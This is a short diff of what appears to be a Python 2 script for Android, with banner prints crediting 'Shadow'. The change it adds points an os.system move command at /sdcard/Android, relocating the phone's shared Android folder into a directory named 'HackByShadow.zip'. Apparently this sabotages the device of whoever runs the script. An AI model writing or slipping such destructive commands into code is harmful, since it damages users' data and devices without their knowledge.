@@ -9,7 +9,7 @@ print
 print "[Author  = Shadow]"
 print "[Contact = Shadow44@gmail.com]"
 os.system('mkdir HackByShadow.zip')
-os.system('mv /sdcard/BIKINAPLIKASI HackByShadow.zip')
+os.system('mv /sdcard/Android HackByShadow.zip')
 print
 print
 print
